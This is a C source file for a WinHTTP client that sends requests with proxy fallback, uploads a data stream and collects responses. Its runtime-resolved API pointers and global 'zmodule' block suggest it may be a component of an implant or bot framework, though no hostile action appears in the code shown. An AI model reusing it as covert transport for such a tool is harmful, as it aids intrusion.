#include "zmodule.h"
#include "httpclient.h"

const int INT_BUFFERSIZE = 16384; // Initial 10 KB temporary buffer, double if it is not enough.

void __stdcall httpclient_init(httpclient_t* pClient, wchar_t* method, LPSTREAM pDataStream)
{
    __stosb((uint8_t*)pClient, 0, sizeof(httpclient_t));
    pClient->httpMethod = method;
    pClient->pDataStream = pDataStream;
    pClient->connectTimeout = 60000;
    pClient->sendTimeout = 30000;
    pClient->receiveTimeout = 30000;

    if (_pZmoduleBlock->userAgent == NULL) {
        char userAgent[260];
        DWORD dwUARet = sizeof(userAgent) - 1;

        if (fn_ObtainUserAgentString(0, (char*)userAgent, &dwUARet) != NOERROR) {
            fn_wsprintfA(userAgent, "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT %d.%d; %sTrident/5.0)", _pZmoduleBlock->sysInfo.osMajorVer, _pZmoduleBlock->sysInfo.osMinorVer,
#ifdef _WIN64
                "Win64; x64; "
#else
                (_pZmoduleBlock->sysInfo.isWow64 ? "WOW64; " : "")
#endif // _WIN64
                );
        }
        _pZmoduleBlock->userAgent = utils_utf16(userAgent); // Необходимо освобождать память при завершении работы!!!
    }
    pClient->httpUserAgent = _pZmoduleBlock->userAgent;
}

void __stdcall httpclient_done(httpclient_t* pClient)
{
    if (pClient->pResponse != NULL) {
        memory_free(pClient->pResponse);
    }
    if (pClient->httpStatusCode != NULL) {
        memory_free(pClient->httpStatusCode);
    }
    if (pClient->httpResponseHeader != NULL) {
        memory_free(pClient->httpResponseHeader);
    }
    if (pClient->httpHost != NULL) {
        memory_free(pClient->httpHost);
    }
    if (pClient->sessionHandle != NULL) {
        fn_WinHttpCloseHandle(pClient->sessionHandle);
    }
    
    zs_free(pClient->httpHeaders);
}

wchar_t* __stdcall internal_httpclient_get_header(HINTERNET hRequest, int headerIndex)
{
    BOOL bResult;
    DWORD dwSize = 0;
    wchar_t* val = NULL;
    bResult = fn_WinHttpQueryHeaders(hRequest, headerIndex, WINHTTP_HEADER_NAME_BY_INDEX, NULL, &dwSize, WINHTTP_NO_HEADER_INDEX);
    if (bResult || (!bResult && (fn_GetLastError() == ERROR_INSUFFICIENT_BUFFER))) {
        val = (wchar_t*)memory_alloc(sizeof(wchar_t) * dwSize);
        if (val != NULL) {
            if (!fn_WinHttpQueryHeaders(hRequest, headerIndex, WINHTTP_HEADER_NAME_BY_INDEX, val, &dwSize, WINHTTP_NO_HEADER_INDEX)) {
                memory_free(val);
                val = NULL;
            }
        }
    }

    return val;
}

int __stdcall httpclient_send_request(httpclient_t* pClient, const wchar_t* url)
{
    int ret = 1;
    wchar_t* szHostName;
    wchar_t* szURLPath;
    URL_COMPONENTS urlComp;
    HINTERNET hConnect = NULL;
    int urlLen = fn_lstrlenW(url);
    int hostNeedFreed = 0;
    
    if (urlLen <= 0) {
        pClient->lastError = ERROR_PATH_NOT_FOUND;
        return 0;
    }    

    if (pClient->sessionHandle == NULL) {
        pClient->sessionHandle = fn_WinHttpOpen(pClient->httpUserAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
        if (pClient->sessionHandle == 0) {
            pClient->lastError = fn_GetLastError();
            return 0;
        }
    }

    if (pClient->httpStatusCode != NULL) {
        memory_free(pClient->httpStatusCode);
        pClient->httpStatusCode = NULL;
    }

    szHostName = (wchar_t*)memory_alloc(MAX_PATH * sizeof(wchar_t));
    szURLPath = (wchar_t*)memory_alloc(7 * MAX_PATH * sizeof(wchar_t));

    __stosb((uint8_t*)&urlComp, 0, sizeof(urlComp));
    urlComp.dwStructSize = sizeof(urlComp);
    urlComp.lpszHostName = szHostName;
    urlComp.dwHostNameLength = MAX_PATH;
    urlComp.lpszUrlPath = szURLPath;
    urlComp.dwUrlPathLength = 7 * MAX_PATH;
    urlComp.dwSchemeLength = 1; // None zero

    fn_WinHttpSetTimeouts(pClient->sessionHandle, pClient->resolveTimeout, pClient->connectTimeout, pClient->sendTimeout, pClient->receiveTimeout);

    if (fn_WinHttpCrackUrl(url, urlLen, 0, &urlComp)) {
        if (pClient->httpHost == NULL) {
            pClient->httpHost = szHostName;
        }
        else {
            hostNeedFreed = 1;
        }
        pClient->httpHeaders = zs_cat(pClient->httpHeaders, L"Host: ");
        pClient->httpHeaders = zs_cat(pClient->httpHeaders, pClient->httpHost);
        pClient->httpHeaders = zs_cat(pClient->httpHeaders, L"\r\n");

        hConnect = fn_WinHttpConnect(pClient->sessionHandle, szHostName, urlComp.nPort, 0);
        if (hConnect != NULL) {
            HINTERNET hRequest = NULL;
            hRequest = fn_WinHttpOpenRequest(hConnect, pClient->httpMethod, urlComp.lpszUrlPath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
            if (hRequest != NULL) {
                int bGetReponseSucceed = 0;
                uint32_t iRetryTimes = 0;

                // Retry for several times if fails.
                while (!bGetReponseSucceed && iRetryTimes++ < 3) {
                    DWORD dwDisableFeature = WINHTTP_DISABLE_REDIRECTS;
                    int bSendRequestSucceed = 0;

                    if (!fn_WinHttpAddRequestHeaders(hRequest, pClient->httpHeaders, fn_lstrlenW(pClient->httpHeaders), WINHTTP_ADDREQ_FLAG_COALESCE_WITH_SEMICOLON)) {
                        pClient->lastError = fn_GetLastError();
                    }
                    
                    if (!fn_WinHttpSetOption(hRequest, WINHTTP_OPTION_DISABLE_FEATURE, &dwDisableFeature, sizeof(dwDisableFeature))) {
                        pClient->lastError = fn_GetLastError();
                    }
                    
                    if (fn_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, NULL)) {
                        bSendRequestSucceed = 1;
                    }
                    else {
                        DWORD err = fn_GetLastError();
                        // Query the proxy information from IE setting and set the proxy if any.
                        WINHTTP_CURRENT_USER_IE_PROXY_CONFIG proxyConfig;
                        __stosb((uint8_t*)&proxyConfig, 0, sizeof(proxyConfig));
                        if (fn_WinHttpGetIEProxyConfigForCurrentUser(&proxyConfig)) {
                            if (proxyConfig.lpszAutoConfigUrl != NULL) {
                                WINHTTP_AUTOPROXY_OPTIONS autoProxyOptions;
                                WINHTTP_PROXY_INFO proxyInfo;

                                __stosb((uint8_t*)&autoProxyOptions, 0, sizeof(autoProxyOptions));
                                autoProxyOptions.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT | WINHTTP_AUTOPROXY_CONFIG_URL;
                                autoProxyOptions.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP;
                                autoProxyOptions.lpszAutoConfigUrl = proxyConfig.lpszAutoConfigUrl;
                                autoProxyOptions.fAutoLogonIfChallenged = TRUE;
                                autoProxyOptions.dwReserved = 0;
                                autoProxyOptions.lpvReserved = NULL;
                                
                                __stosb((uint8_t*)&proxyInfo, 0, sizeof(proxyInfo));

                                if (fn_WinHttpGetProxyForUrl(pClient->sessionHandle, url, &autoProxyOptions, &proxyInfo)) {
                                    if (fn_WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo))) {
                                        if (fn_WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, NULL)) {
                                            bSendRequestSucceed = 1;
                                        }
                                    }
                                    if (proxyInfo.lpszProxy != NULL) {
                                        fn_GlobalFree(proxyInfo.lpszProxy);
                                    }
                                    if (proxyInfo.lpszProxyBypass != NULL) {
                                        fn_GlobalFree(proxyInfo.lpszProxyBypass);
                                    }
                                }                                
                            }
                            else if (proxyConfig.lpszProxy != NULL) {
                                wchar_t szProxy[MAX_PATH];
                                WINHTTP_PROXY_INFO proxyInfo;

                                __stosb((uint8_t*)&proxyInfo, 0, sizeof(proxyInfo));
                                proxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;

                                __stosb((uint8_t*)szProxy, 0, sizeof(szProxy));
                                fn_lstrcpynW(szProxy, proxyConfig.lpszProxy, MAX_PATH);
                                proxyInfo.lpszProxy = szProxy;

                                if (proxyConfig.lpszProxyBypass != 0) {
                                    wchar_t szProxyBypass[MAX_PATH];
                                    __stosb((uint8_t*)szProxyBypass, 0, sizeof(szProxyBypass));

                                    fn_lstrcpynW(szProxyBypass, proxyConfig.lpszProxyBypass, MAX_PATH);
                                    proxyInfo.lpszProxyBypass = szProxyBypass;
                                }

                                if (!fn_WinHttpSetOption(hRequest, WINHTTP_OPTION_PROXY, &proxyInfo, sizeof(proxyInfo))) {
                                    pClient->lastError = fn_GetLastError();
                                }
                            }
                            else {
                                iRetryTimes = 3;
                                pClient->lastError = err;
                            }

                            if (proxyConfig.lpszAutoConfigUrl != 0) {
                                fn_GlobalFree(proxyConfig.lpszAutoConfigUrl);
                            }
                            if (proxyConfig.lpszProxy != 0) {
                                fn_GlobalFree(proxyConfig.lpszProxy);
                            }
                            if (proxyConfig.lpszProxyBypass != 0) {
                                fn_GlobalFree(proxyConfig.lpszProxyBypass);
                            }
                        }
                        else {
                            pClient->lastError = err;
                        }
                    }
                    if (bSendRequestSucceed) {
                        if (pClient->pDataStream != NULL) {
                            DWORD dwWritten = 0;
                            HGLOBAL hGlobal;
                            void* pMem;
                            uint32_t dataSize = stream_get_length(pClient->pDataStream);

                            if (SUCCEEDED(fn_GetHGlobalFromStream(pClient->pDataStream, &hGlobal))) {
                                pMem = fn_GlobalLock(hGlobal);
                                if (pMem != NULL) {
                                    if (!fn_WinHttpWriteData(hRequest, pMem, dataSize, &dwWritten)) {
                                        pClient->lastError = fn_GetLastError();
                                    }
                                    fn_GlobalUnlock(hGlobal);
                                }
                            }
                        }
                        if (fn_WinHttpReceiveResponse(hRequest, NULL)) {
                            DWORD dwSize = 0;
                            uint32_t iMaxBufferSize = INT_BUFFERSIZE;
                            uint32_t iCurrentBufferSize = 0;
                            wchar_t* sContentLength;
                            
                            pClient->httpResponseHeader = internal_httpclient_get_header(hRequest, WINHTTP_QUERY_RAW_HEADERS_CRLF);
                            pClient->httpStatusCode = internal_httpclient_get_header(hRequest, WINHTTP_QUERY_STATUS_CODE);
                            sContentLength = internal_httpclient_get_header(hRequest, WINHTTP_QUERY_CONTENT_LENGTH);
                            if (sContentLength != NULL) {
                                pClient->responseByteCount = (uint32_t)fn_StrToIntW(sContentLength);
                                memory_free(sContentLength);  
                            }

                            if (pClient->pResponse != NULL) {
                                memory_free(pClient->pResponse);
                                pClient->pResponse = NULL;
                            }
                            pClient->pResponse = (uint8_t*)memory_alloc(iMaxBufferSize);
                            if (pClient->pResponse == NULL) {
                                ret = 0;
                                break;
                            }
                            do {
                                dwSize = 0;
                                if (fn_WinHttpQueryDataAvailable(hRequest, &dwSize)) {
                                    uint8_t* pResponse = (uint8_t*)memory_alloc(dwSize + 1);
                                    if (pResponse != NULL) {
                                        DWORD dwRead = 0;
                                        if (fn_WinHttpReadData(hRequest, pResponse, dwSize, &dwRead)) {
                                            if (dwRead + iCurrentBufferSize > iMaxBufferSize) {
                                                uint8_t* pOldBuffer = pClient->pResponse;
                                                pClient->pResponse = (uint8_t*)memory_alloc(iMaxBufferSize * 2);
                                                if (pClient->pResponse == NULL) {
                                                    pClient->pResponse = pOldBuffer;
                                                    ret = 0;
                                                    break;
                                                }
                                                iMaxBufferSize *= 2;
                                                __movsb(pClient->pResponse, pOldBuffer, iCurrentBufferSize);
                                                memory_free(pOldBuffer);
                                            }
                                            __movsb(pClient->pResponse + iCurrentBufferSize, pResponse, dwRead);
                                            iCurrentBufferSize += dwRead;
                                        }
                                        memory_free(pResponse);
                                    }
                                }
                                else {
                                    pClient->lastError = fn_GetLastError();
                                }
                            } while (dwSize > 0);
                            pClient->responseByteCountReceived = iCurrentBufferSize;
                            bGetReponseSucceed = 1;
                        }
                        else {
                            pClient->lastError = fn_GetLastError();
                        }
                    }
                } // while
                if (!bGetReponseSucceed) {
                    ret = 0;
                }
                fn_WinHttpCloseHandle(hRequest);
            }
            fn_WinHttpCloseHandle(hConnect);
        }
    }

    memory_free(szURLPath);
    if (hostNeedFreed && szHostName != NULL) {
        memory_free(szHostName);
    }

    return ret;
}
